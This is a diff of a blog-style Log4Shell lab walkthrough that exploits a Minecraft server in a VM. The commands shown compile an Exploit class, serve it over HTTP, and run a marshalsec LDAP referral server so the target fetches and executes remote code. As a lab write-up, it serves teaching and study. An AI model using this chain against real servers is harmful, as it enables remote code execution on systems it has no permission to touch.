@@ -12,7 +12,7 @@ Log4j is a Java library that is used in many Java-based applications. Java has b
 # 2. Attack details
 Below is the the diagram for the attack flow.
 
-![Log4j attack. Source: cloudtango.net](https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4j_attack-1024x692.jpg)
+![Log4j attack. Source: cloudtango.net](https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/log4j_attack-1024x692.jpg)
 
 To be more wordy, let's dive into the attack.
 
@@ -65,7 +65,7 @@ What the POC does:
 - The Java `Exploit.class` (created by `Exploit.java`) that will be loaded by the Minecraft server.
 - A `http server` from which the Minecraft server will download the Exploit.class
 
-##### Step 1. Write the exploit code:
+Start by writing the exploit code:
 
 ```java
 public class Exploit {
@@ -80,19 +80,19 @@ public class Exploit {
 }
 ```
 
-##### Step 2. Compile Exploit.java to Exploit.class
+We then compile Exploit.java to Exploit.class using javac from JDK 8u181.
 
 ```sh
 javac Exploit.java
 ```
 
-##### Step 3. Host the exploit class using a Python http server (Same directory as the Exploit.class):
+Use the Python http server to host the exploit class.
 
 ```sh
 python3 -m http.server 10000
 ```
 
-##### Step 4. Start the LDAP server:
+Start the LDAP server and points it to the HTTP server.
 
 ```sh
 git clone https://github.com/mbechler/marshalsec.git
@@ -101,7 +101,7 @@ mvn clean package -DskipTests
 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.30.146.202:10000/#Exploit"
 ```
 
-##### Step 5. Run the Minecraft server on a VM (I set it to bridged mode):
+Run the Minecraft server on a VM (I set it to bridged mode):
 ```
 - Remember to get the IP of the VM. 
 - Mine is 172.30.146.200.
@@ -115,17 +115,60 @@ java -jar server.jar
 
 After you start the server a bunch of properties will be filled up in the server.properties file. Go to that file and edit the option online-mode to false. The online-mode option, if set to true, requires all players to be authenticated to Xbox-Live. 
 
+<figure>
+  <img
+  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_properties.PNG"
+  alt="Minecraft Client">
+  <center><figcaption>Server properties</figcaption></center>
+</figure>
+
+
 Rerun the server:
 
 ```sh
 java -jar server.jar
 ```
 
-| ![Minecraft-server](https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_server_online_mode_false.PNG) |
-|:--:| 
-| *Minecraft server cmdline output.* |
+Start the Minecraft client
 
-##### Step 6. Start the Minecraft client:
-``` 
-Choose the 1.15.1 version
-```
+<figure>
+  <img
+  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_launcher.PNG"
+  alt="Minecraft Client">
+  <center><figcaption>Choose 1.15.1 for the client</figcaption></center>
+</figure>
+
+Connect to the Minecraft server
+
+<figure>
+  <img
+  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/Minecraft_direct_connect.PNG"
+  alt="Minecraft Client">
+  <center><figcaption>Use multiplayer and enter the server IP + port</figcaption></center>
+</figure>
+
+<figure>
+  <img
+  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_player_joined.PNG"
+  alt="Minecraft Client">
+  <center><figcaption>The account is recorded as logged in.</figcaption></center>
+</figure>
+
+Run the exploit
+<figure>
+  <img
+  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_poc_cmd.PNG"
+  alt="Minecraft Client">
+  <center><figcaption>JNDI LDAP Payload</figcaption></center>
+</figure>
+
+The server will then log the chat, evaluate the lookup function, make a connection to the ldap server and then loads the exploit code hosted on the HTTP server:
+
+<figure>
+  <img
+  src="https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/posts/log4shell/minecraft_log4j_ran.PNG"
+  alt="Minecraft Client">
+  <center><figcaption>The infamous Calculator.</figcaption></center>
+</figure>
+
+And that's it. Hope you have fun exploiting Log4J!
